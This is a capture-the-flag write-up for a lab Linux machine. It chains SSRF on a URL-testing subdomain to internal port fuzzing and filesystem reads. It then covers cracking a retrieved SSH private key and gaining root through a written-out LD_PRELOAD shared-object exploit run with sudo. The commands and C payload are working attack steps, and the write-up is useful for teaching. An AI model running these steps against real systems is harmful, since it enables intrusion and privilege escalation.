## Summary

Linux machine running nginx. Initial enumeration revealed a subdomain hosting a URL testing tool vulnerable to SSRF. The SSRF was used to discover an internal service on port 1337 exposing the filesystem via directory listing. Saad's SSH private key was retrieved, cracked, and used for initial access. Privilege escalation achieved via LD_PRELOAD abuse with sudo.

## Reconnaissance

### Nmap scan

nmap -Pn -sC -sV --min-rate 5000 -oN creative.txt 10.114.178.162

Open ports:

- 22: SSH OpenSSH 8.2p1 Ubuntu
- 80: HTTP nginx 1.18.0

## Exploitation

### SSRF Discovery

Tested [http://127.0.0.1](http://127.0.0.1/) -> returned creative.thm content (SSRF confirmed)

### Internal Port Scanning via SSRF

ffuf -w /usr/share/seclists/Discovery/Infrastructure/common-http-ports.txt -u [http://beta.creative.thm](http://beta.creative.thm/) -d "url=http://127.0.0.1:FUZZ" -X POST -H "Content-Type: application/x-www-form-urlencoded" -fs 0 -t 20 --timeout 30

Port 1337: returned full filesystem directory listing

### File System Access via SSRF

[http://127.0.0.1:1337/](http://127.0.0.1:1337/) -> root filesystem [http://127.0.0.1:1337/home/](http://127.0.0.1:1337/home/) -> saad, ubuntu [http://127.0.0.1:1337/home/saad/](http://127.0.0.1:1337/home/saad/) -> .ssh/id_rsa, user.txt

### SSH Key Retrieval and Cracking

Retrieved: [http://127.0.0.1:1337/home/saad/.ssh/id_rsa](http://127.0.0.1:1337/home/saad/.ssh/id_rsa) Saved to ~/saad_id_rsa

ssh2john ~/saad_id_rsa > hash_saad.txt john --wordlist=/usr/share/wordlists/rockyou.txt hash_saad.txt -> Passphrase: sweetness

### Initial Access

## Privilege Escalation

### Password in bash_history

cat ~/.bash_history -> echo "saad:MyStrongestPasswordYet$4291" > creds.txt

### sudo -l

sudo -l

# Password: MyStrongestPasswordYet$4291

Output:

- env_keep+=LD_PRELOAD
- (root) /usr/bin/ping

### LD_PRELOAD Exploit

cat > /tmp/shell.c << EOF #include <stdio.h> #include <sys/types.h> #include <stdlib.h> void _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); } EOF

gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles sudo LD_PRELOAD=/tmp/shell.so ping

Result: Root shell

## Lessons Learned

**1.** Virtual host enumeration with ffuf is essential — subdomains often expose hidden functionality like internal tools that aren't accessible from the main domain.

**2.** SSRF can be chained with internal services — finding port 1337 via SSRF turned a simple web vulnerability into full filesystem access, including SSH keys.

**3.** Always check `.bash_history` after getting a shell — developers often accidentally type passwords in plain text, and `HISTFILE=/dev/null` in `.bashrc` doesn't erase what was already logged.
